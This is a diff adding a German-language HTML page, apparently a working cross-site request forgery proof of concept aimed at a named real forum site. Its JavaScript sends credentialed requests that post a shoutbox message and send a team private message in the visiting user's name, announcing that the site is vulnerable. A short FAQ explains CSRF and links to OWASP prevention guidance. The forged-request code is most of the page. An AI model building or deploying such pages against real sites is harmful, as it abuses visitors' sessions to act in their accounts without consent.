@@ -1,0 +1,124 @@
+<!DOCTYPE html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+
+    <title>New Propaganda CSRF Test</title>
+  </head>
+  <body>
+    <div class="container">
+        <div class="card mt-5">
+            <div class="card-header">Shoutbox Insert</div>
+            <div class="card-body">
+                <p>Dieser Request schreibt <samp>Diese Seite ist für CSRF anfällig. https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet</samp> für den jeweiligen User in die Shoutbox</p>
+                <button type="button" class="btn btn-primary" id="shoutbox_test">Send Request</button>
+            </div>
+        </div>
+
+        <div class="card mt-3">
+            <div class="card-header">Team PM</div>
+            <div class="card-body">
+                <p>Dieser Request schickt eine <em>Team-PM</em> mit einer, nicht ganz netten, Nachricht über CSRF and das Team.</p>                
+                <form class="dn" id="teampm_form" name="teampm_form">
+                    <div class="form-group">
+                        <input class="form-control" type="text" id="teampm_subject" name="subject" value="Diese Seite ist anfällig für CSRF">
+                    </div>
+                    <div class="form-group">
+                        <textarea class="form-control" rows="10" id="teampm_msg" name="msg">Hallo Team,
+
+dies ist eine "automatische" Nachricht, generiert von https://fuchsi.github.io/np_csrf.html
+Eure Seite ist leider anfällig für CSRF (Cross-Site Request Forgery), das ist eine sehr sehr alte Attacke, die sich sehr einfach blockieren lässt. Aber anscheinend ist euch das egal.
+
+Darum lasse ich euch diesen Link (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet) hier, damit euer Coder das Problem beheben kann.
+
+Liebe Grüße</textarea>
+                    </div>
+                </form>
+                <button type="button" class="btn btn-primary" id="teampm_test">Send Request</button>
+            </div>
+        </div>
+
+        <div class="card mt-3">
+            <div class="card-header">Was ist das und warum funktioniert das?</div>
+            <div class="card-body">
+                <p>Das ganze nennt sich <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-Site Request Forgery</a> oder kurz <abbr title="Cross-Site Request Forgery">CSRF</abbr> und ist eine Angriff, der den User dazu zwingt unerwünschte Aktionen auf anderen Seiten auszuführen. Mehr in dem Link.</p>
+
+                <h5>Warum das bei NP funktioniert?</h5>
+                <p>Weil dort keine Gegenmaßnahmen eingesetzt werden. Ganz Einfach.</p>
+
+                <h5>Das ist doch bestimmt ein neuer Angriff?</h5>
+                <p>Nein. Das ist ein alter Hut und es gibt schon sehr lange einfache und geeignete Gegenmaßnahmen</p>
+
+                <h5>Diese Gegenmaßnahmen?</h5>
+                <p>Das <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet">CSRF Prevention Cheat Sheet</a> hat da eine gute und einfach Zusammenfassung.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+    <script>
+        function getData(url) {            
+            return fetch(url, {               
+                cache: 'no-cache',
+                credentials: 'include',
+                method: 'GET',
+                mode: 'no-cors',
+                redirect: 'follow',
+                referrer: 'no-referrer',
+                headers: {
+                    'content-type': 'text/html'
+                },
+                })
+        }       
+
+        function postData(url, formData) {            
+            return fetch(url, {               
+                body: formData,
+                cache: 'no-cache',
+                credentials: 'include',
+                method: 'POST',
+                mode: 'no-cors',
+                redirect: 'follow',
+                referrer: 'no-referrer',
+                /*headers: {                  
+                  'content-type': 'multipart/form-data'
+                },*/
+                })
+        }       
+
+        $(() => {
+            $('#shoutbox_test').click(e => {                
+                getData('https://irrenhaus.dyndns.dk/shoutx.php?b=1&shbox_text=Diese%20Seite%20ist%20f%C3%BCr%20CSRF%20anf%C3%A4llig.%20https%3A%2F%2Fwww.owasp.org%2Findex.php%2FCross-Site_Request_Forgery_%5C(CSRF%5C)_Prevention_Cheat_Sheet')
+                .then(response => {
+                    console.log(response);                   
+                })
+                .catch(function(error) {
+                    console.log(`Error: ${error.message}`);
+                });
+            });
+
+            $('#teampm_test').click(e => {
+                let form = new FormData(document.getElementById('teampm_form'));
+                console.log(form);
+                postData('https://irrenhaus.dyndns.dk/takecontact.php', form)
+                .then(response => {
+                    console.log(response);                   
+                })
+                .catch(function(error) {
+                    console.log(`Error: ${error.message}`);
+                });
+            })
+        });
+    </script>
+  </body>
+</html>
